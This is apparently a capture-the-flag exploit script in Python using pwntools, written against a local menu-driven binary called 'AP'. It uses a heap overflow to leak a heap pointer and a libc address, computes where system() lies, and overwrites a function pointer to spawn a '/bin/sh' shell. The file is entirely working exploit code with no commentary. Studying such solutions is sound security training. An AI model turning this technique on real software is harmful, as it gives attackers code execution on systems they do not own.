from pwn import *

context.log_level='DEBUG'

p=process('./AP')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

local=0

def debug():
	print p.pid
	pause()

def get(length,name):
	p.sendlineafter('>>','1')
	p.sendlineafter(':',str(length))
	p.sendafter(':',str(name))

def open(idx):
	p.sendlineafter('>>','2')
	p.sendlineafter('?',str(idx))

def change(idx,length,name):
	p.sendlineafter('>>','3')
	p.sendlineafter('?',str(idx))
	p.sendlineafter(':',str(length))
	p.sendafter(':',str(name))

get(0x10,'a'*0x9)
get(0x10,'/bin/sh'.ljust(0xf,'\x00'))
change(0,0x21,'c'*0x20)
open(0)
p.recvuntil('c'*0x20)
binsh=u64(p.recv(6).ljust(8,'\x00'))
success('binsh_heap:'+hex(binsh))

change(0,0x29,'d'*0x28)
open(0)
p.recvuntil('d'*0x28)
puts_got=u64(p.recv(6).ljust(8,'\x00'))
success('puts_got:'+hex(puts_got))
libc_base=puts_got-libc.sym['puts']
success('libc_base:'+hex(libc_base))

sys=libc_base+libc.sym['system']
payload='e'*4*8+p64(binsh)+p64(sys)
change(0,0x31,payload)

if local:
	debug()

open(1)

p.interactive()